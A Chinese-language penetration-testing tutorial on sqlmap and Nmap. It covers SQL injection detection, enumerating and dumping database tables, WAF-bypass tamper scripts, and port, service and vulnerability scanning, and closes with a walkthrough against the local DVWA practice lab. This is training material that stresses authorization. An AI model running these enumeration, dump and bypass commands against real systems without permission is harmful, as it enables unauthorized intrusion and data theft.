# 02 sqlmap/Nmap —— 自动化检测利器

> Burp Suite让你手动测试，sqlmap和Nmap帮你自动化。
> sqlmap专攻SQL注入，Nmap专攻网络探测。
> 先理解原理，再用工具——否则工具报什么你都看不懂。

---

## 一、sqlmap —— SQL注入自动化神器

### 1.1 安装

```bash
# 方法1：pip安装
pip3 install sqlmap

# 方法2：Git克隆（推荐，保持最新）
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version

# Kali Linux自带sqlmap
```

### 1.2 基本用法

```bash
# 检测GET参数是否存在SQL注入
sqlmap -u "http://target.com/page?id=1"

# 带Cookie（需要登录的页面）
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123; security=low"

# 检测POST参数
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# 从Burp保存的请求文件中测试
# 先在Burp中右键请求 → Save item → 保存为request.txt
sqlmap -r request.txt

# --batch参数：自动选择默认选项（不需要人工交互）
sqlmap -u "http://target.com/page?id=1" --batch
```

### 1.3 信息获取（由浅入深）

```bash
# 第1步：确认注入后，获取数据库列表
sqlmap -u "..." --dbs

# 第2步：获取指定数据库的表
sqlmap -u "..." -D database_name --tables

# 第3步：获取表的列名
sqlmap -u "..." -D database_name -T table_name --columns

# 第4步：导出数据
sqlmap -u "..." -D database_name -T users --dump

# 获取当前数据库名
sqlmap -u "..." --current-db

# 获取当前用户
sqlmap -u "..." --current-user

# 判断是否是DBA权限
sqlmap -u "..." --is-dba
```

### 1.4 进阶参数

```bash
# 指定注入技术
# B=布尔盲注, T=时间盲注, U=UNION, E=报错, S=堆叠
sqlmap -u "..." --technique=BU

# 指定数据库类型（加速检测）
sqlmap -u "..." --dbms=mysql

# 设置线程数（加速）
sqlmap -u "..." --threads=5

# 设置风险和级别
# --level: 1-5 测试深度（默认1，3会测试Cookie和Referer，5测试所有Header）
# --risk: 1-3 风险等级（默认1，3会使用可能改数据的payload）
sqlmap -u "..." --level=3 --risk=2

# 绕过WAF
sqlmap -u "..." --tamper=space2comment,between
# 常用tamper脚本：
#   space2comment  → 空格变注释
#   between        → 用BETWEEN替换>
#   randomcase     → 随机大小写
#   base64encode   → Base64编码

# 使用代理（通过Burp代理可以在Burp中看到sqlmap的请求）
sqlmap -u "..." --proxy=http://127.0.0.1:8080
```

### 1.5 重要原则

```
[1] 先手工确认，再用sqlmap
  sqlmap会发送大量请求（几百到几千个）
  如果注入不存在，白白制造噪音
  先用Burp手工确认有注入，再用sqlmap提效率

[2] 只在授权范围内使用
  sqlmap对目标服务器有实质性影响
  未授权使用 = 违法

[3] 看懂输出
  sqlmap会告诉你：注入类型、使用的payload、数据库版本
  你要能理解这些信息的含义
```

---

## 二、Nmap —— 网络探测之王

### 2.1 安装

```bash
# Ubuntu/Debian
apt install nmap

# CentOS
yum install nmap

# Kali Linux自带
```

### 2.2 基本扫描

```bash
# 扫描单个主机的常见端口
nmap 192.168.1.1

# 扫描指定端口
nmap -p 80,443,8080 192.168.1.1

# 扫描端口范围
nmap -p 1-1000 192.168.1.1

# 扫描所有端口
nmap -p- 192.168.1.1

# 扫描网段
nmap 192.168.1.0/24

# 快速扫描（只扫常见100个端口）
nmap -F 192.168.1.1
```

### 2.3 扫描技术

```bash
# TCP SYN扫描（默认，最常用，需要root权限）
# 只发SYN，不完成握手，速度快且隐蔽
sudo nmap -sS 192.168.1.1

# TCP Connect扫描（不需root，完成完整握手）
nmap -sT 192.168.1.1

# UDP扫描（检测UDP服务，如DNS/SNMP）
sudo nmap -sU 192.168.1.1

# Ping扫描（只检测主机是否存活，不扫端口）
nmap -sn 192.168.1.0/24

# 跳过主机发现（对方禁ping时使用）
nmap -Pn 192.168.1.1
```

### 2.4 服务和版本检测

```bash
# 服务版本检测（-sV）
nmap -sV 192.168.1.1
# 输出示例：
# PORT    STATE SERVICE  VERSION
# 22/tcp  open  ssh      OpenSSH 8.2p1
# 80/tcp  open  http     Apache httpd 2.4.41
# 3306/tcp open mysql    MySQL 5.7.33

# 操作系统检测（-O，需要root）
sudo nmap -O 192.168.1.1

# 常用组合：版本+OS+脚本检测
sudo nmap -sV -O -sC 192.168.1.1

# -A 全面扫描（包含-sV -O -sC --traceroute）
sudo nmap -A 192.168.1.1
```

### 2.5 NSE脚本

```bash
# Nmap Scripting Engine (NSE) —— Nmap的插件系统
# 脚本位置：/usr/share/nmap/scripts/

# 使用默认脚本
nmap -sC 192.168.1.1

# 使用指定脚本
nmap --script=http-title 192.168.1.1        # 获取Web页面标题
nmap --script=http-headers 192.168.1.1      # 获取HTTP响应头
nmap --script=ssl-enum-ciphers -p 443 target # 检测SSL/TLS配置

# 漏洞检测脚本
nmap --script=vuln 192.168.1.1              # 运行所有漏洞检测脚本

# 搜索可用脚本
ls /usr/share/nmap/scripts/ | grep http
nmap --script-help http-sql-injection
```

### 2.6 输出格式

```bash
# 正常输出（默认）
nmap 192.168.1.1

# 保存为XML（可导入其他工具）
nmap 192.168.1.1 -oX result.xml

# 保存为所有格式
nmap 192.168.1.1 -oA result
# 生成：result.nmap, result.xml, result.gnmap

# Grep友好格式
nmap 192.168.1.1 -oG result.gnmap
```

---

## 三、实战组合

### 场景：对DVWA靶场做完整测试

```bash
# 1. Nmap探测靶场开放了什么端口和服务
nmap -sV -p- localhost

# 2. 发现80端口是Apache+PHP → Web应用
# 3. 用Burp浏览DVWA，收集所有接口
# 4. 手工确认SQL注入存在
# 5. sqlmap自动化提取数据

sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx; security=low" \
  --batch \
  --dbs

# 6. 获取数据
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump --batch
```

---

## 四、自测清单

- [ ] sqlmap的基本用法（-u, --cookie, --data, -r）？
- [ ] sqlmap提取数据的步骤（--dbs → --tables → --columns → --dump）？
- [ ] 什么时候应该用sqlmap，什么时候应该手工？
- [ ] Nmap的基本端口扫描命令？
- [ ] -sS、-sT、-sV、-O分别是什么？
- [ ] 怎么用Nmap的NSE脚本做简单的漏洞检测？
- [ ] 能对DVWA完成一次sqlmap完整流程？

---

> **下一模块：** [03 浏览器DevTools](../03-browser-devtools/README.md) —— 被低估的安全工具
